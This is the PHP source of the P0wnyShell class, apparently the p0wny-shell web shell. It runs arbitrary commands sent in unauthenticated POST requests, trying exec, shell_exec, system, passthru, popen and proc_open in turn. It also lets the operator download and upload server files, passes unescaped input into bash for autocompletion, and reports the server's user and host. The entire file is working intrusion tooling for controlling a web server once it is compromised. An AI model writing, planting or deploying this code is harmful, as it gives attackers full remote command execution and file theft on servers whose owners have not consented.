<?php

class P0wnyShell
{

    protected $logo = <<<LOGO
X        ___                         ____      _          _ _        _  _
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|
|_|                         |___/  \____/X
LOGO;


    /**
     * Ask the shell to expand the given path
     *
     * @param string $path
     * @return string
     */
    protected function expandPath($path)
    {
        if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
            exec("echo $match[1]", $stdout);
            return $stdout[0] . $match[2];
        }
        return $path;
    }

    /**
     * Check that all given functions exist
     *
     * @param string[] $list
     * @return bool
     */
    protected function allFunctionExist($list = [])
    {
        foreach ($list as $entry) {
            if (!function_exists($entry)) {
                return false;
            }
        }
        return true;
    }

    /**
     * Try to pass the given command to the shell and execute it
     *
     * Tries multiple ways to execute the command
     * @param string $cmd The command to execute
     * @return string The output
     */
    protected function executeCommand($cmd)
    {
        $output = '';
        if (function_exists('exec')) {
            exec($cmd, $output);
            $output = implode("\n", (array)$output);
        } else if (function_exists('shell_exec')) {
            $output = shell_exec($cmd);
        } else if ($this->allFunctionExist(['system', 'ob_start', 'ob_get_contents', 'ob_end_clean'])) {
            ob_start();
            system($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } else if ($this->allFunctionExist(['passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'])) {
            ob_start();
            passthru($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } else if ($this->allFunctionExist(['popen', 'feof', 'fread', 'pclose'])) {
            $handle = popen($cmd, 'r');
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
        } else if ($this->allFunctionExist(['proc_open', 'stream_get_contents', 'proc_close'])) {
            $handle = proc_open($cmd, [0 => ['pipe', 'r'], 1 => ['pipe', 'w']], $pipes);
            $output = stream_get_contents($pipes[1]);
            proc_close($handle);
        }
        return $output;
    }

    /**
     * Is this running on a windows system?
     *
     * @return bool
     */
    protected function isRunningWindows()
    {
        return stripos(PHP_OS, "WIN") === 0;
    }

    /**
     * Execute the given command
     *
     * @param string $cmd The command to execute
     * @param string $cwd The current working directory
     * @return array
     */
    public function featureShell($cmd, $cwd)
    {
        $stdout = "";

        if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
            chdir($this->expandPath("~"));
        } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
            chdir($cwd);
            preg_match("/^\s*cd\s+(\S+)\s*(2>&1)?$/", $cmd, $match);
            chdir($this->expandPath($match[1]));
        } elseif (preg_match("/^\s*download\s+\S+\s*(2>&1)?$/", $cmd)) {
            chdir($cwd);
            preg_match("/^\s*download\s+(\S+)\s*(2>&1)?$/", $cmd, $match);
            return $this->featureDownload($match[1]);
        } else {
            chdir($cwd);
            $stdout = $this->executeCommand($cmd);
        }

        return array(
            "stdout" => base64_encode($stdout),
            "cwd" => base64_encode(getcwd())
        );
    }

    /**
     * Get the current working directory
     *
     * @return array
     */
    public function featurePwd()
    {
        return array("cwd" => base64_encode(getcwd()));
    }

    /**
     * Create autocompletion hints
     *
     * @param string $fileName The part to complete
     * @param string $cwd The current working directory
     * @param string $type The type of completion (cmd or file)
     * @return array
     */
    public function featureHint($fileName, $cwd, $type)
    {
        chdir($cwd);
        if ($type == 'cmd') {
            $cmd = "compgen -c $fileName";
        } else {
            $cmd = "compgen -f $fileName";
        }
        $cmd = "/bin/bash -c \"$cmd\"";
        $files = explode("\n", shell_exec($cmd));
        foreach ($files as &$filename) {
            $filename = base64_encode($filename);
        }
        return array(
            'files' => $files,
        );
    }

    /**
     * Pass a file to the browser for download
     *
     * @param $filePath
     * @return array
     */
    public function featureDownload($filePath)
    {
        $file = @file_get_contents($filePath);
        if ($file === FALSE) {
            return array(
                'stdout' => base64_encode('File not found / no read permission.'),
                'cwd' => base64_encode(getcwd())
            );
        } else {
            return array(
                'name' => base64_encode(basename($filePath)),
                'file' => base64_encode($file)
            );
        }
    }

    /**
     * Save the given file to the given path
     *
     * @param string $path File to write, may be relative to the current working directory
     * @param string $file Base64 encoded file contents
     * @param string $cwd current working directory
     * @return array
     */
    public function featureUpload($path, $file, $cwd)
    {
        chdir($cwd);
        $f = @fopen($path, 'wb');
        if ($f === FALSE) {
            return array(
                'stdout' => base64_encode('Invalid path / no write permission.'),
                'cwd' => base64_encode(getcwd())
            );
        } else {
            fwrite($f, base64_decode($file));
            fclose($f);
            return array(
                'stdout' => base64_encode('Done.'),
                'cwd' => base64_encode(getcwd())
            );
        }
    }

    /**
     * Get the current user and host
     *
     * @return array
     */
    public function featureUserHost($cwd)
    {
        chdir($cwd);
        $result = [
            'username' => '',
            'hostname' => '',
            'cwd' => base64_encode(getcwd())
        ];

        if ($this->isRunningWindows()) {
            $username = getenv('USERNAME');
            if ($username !== false) {
                $result['username'] = base64_encode($username);
            }
        } else {
            $pwuid = posix_getpwuid(posix_geteuid());
            if ($pwuid !== false) {
                $result['username'] = base64_encode($pwuid['name']);
            }
        }

        $hostname = gethostname();
        if ($hostname !== false) {
            $result['hostname'] = base64_encode($hostname);
        }

        return $result;
    }

    /**
     * Output some minimal HTML to load the shell
     *
     * @return void
     */
    public function html()
    {
        $logo = trim(trim($this->logo, " \n"), "X");

        echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>p0wny@shell:~#</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
        }
    </style>
</head>
<body>
    <p0wny-shell>$logo</p0wny-shell>
</body>
<script src="P0wnyShell.js"></script>
</html>
HTML;
    }

    /**
     * Execute the feature given in the GET parameter
     *
     * @return void
     */
    public function execute()
    {
        if (!isset($_GET["feature"])) die('no feature');

        $response = NULL;
        switch ($_GET["feature"]) {
            case "shell":
                $cmd = $_POST['cmd'];
                if (!preg_match('/2>/', $cmd)) {
                    $cmd .= ' 2>&1';
                }
                $response = $this->featureShell($cmd, $_POST["cwd"]);
                break;
            case "pwd":
                $response = $this->featurePwd();
                break;
            case "hint":
                $response = $this->featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
                break;
            case 'upload':
                $response = $this->featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
                break;
            case 'userhost':
                $response = $this->featureUserHost($_POST['cwd']);
                break;
        }

        header("Content-Type: application/json");
        echo json_encode($response);
        exit();
    }
}
